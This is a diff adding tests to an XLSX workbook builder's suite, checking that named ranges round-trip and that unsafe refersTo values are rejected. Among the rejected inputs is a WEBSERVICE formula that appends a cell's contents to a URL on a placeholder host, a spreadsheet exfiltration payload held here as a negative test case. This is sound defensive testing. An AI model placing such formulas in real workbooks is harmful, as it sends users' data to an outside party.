@@ -1631,6 +1631,59 @@ describe("buildXlsxPackageFromContent: definitions table (general defined names 
     expect(readWorkbookDefinitions(pkg)).toEqual(namedRangeDefinitions());
   });
 
+  it("writes sheet-quoted ranges, unions, column ranges, and row ranges as named ranges, and recovers each through readWorkbookDefinitions", () => {
+    const definitions: DefinitionsTable = {
+      "namedRange:Quoted": {
+        kind: "namedRange",
+        name: "Quoted",
+        refersTo: "'Q1 Summary'!$A$1:$C$3",
+      },
+      "namedRange:Union": {
+        kind: "namedRange",
+        name: "Union",
+        refersTo: "Sheet1!$A$1:$A$9,Sheet1!$C$1:$C$9",
+      },
+      "namedRange:Columns": {
+        kind: "namedRange",
+        name: "Columns",
+        refersTo: "Sheet1!$A:$C",
+      },
+      "namedRange:Rows": {
+        kind: "namedRange",
+        name: "Rows",
+        refersTo: "Sheet1!$1:$3",
+      },
+    };
+    const pkg = buildXlsxPackageFromContent(singleSheetDocument([]), {
+      definitions,
+    });
+    expect(readWorkbookDefinitions(pkg)).toEqual(definitions);
+  });
+
+  it("refuses a named range whose refersTo carries formula or external-reference content, by name", () => {
+    const refused: readonly string[] = [
+      'Sheet1!$A$1&WEBSERVICE("http://example.invalid/"&A1)',
+      "SUM(Sheet1!$A$1:$A$9)",
+      "[1]Sheet1!$A$1",
+      "Sheet1!$A$1:INDEX($A:$A,9)",
+      "$A$1:$B$2",
+      "=Sheet1!$A$1",
+      "#REF!",
+    ];
+    for (const refersTo of refused) {
+      const definitions: DefinitionsTable = {
+        "namedRange:Danger": {
+          kind: "namedRange",
+          name: "Danger",
+          refersTo,
+        },
+      };
+      expect(() =>
+        buildXlsxPackageFromContent(singleSheetDocument([]), { definitions }),
+      ).toThrow(/sheet-qualified internal A1 reference/);
+    }
+  });
+
   it("writes no <definedNames> container and no xl/tables part at all when no definitions are supplied", () => {
     const pkg = buildXlsxPackageFromContent(singleSheetDocument([]));
     const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
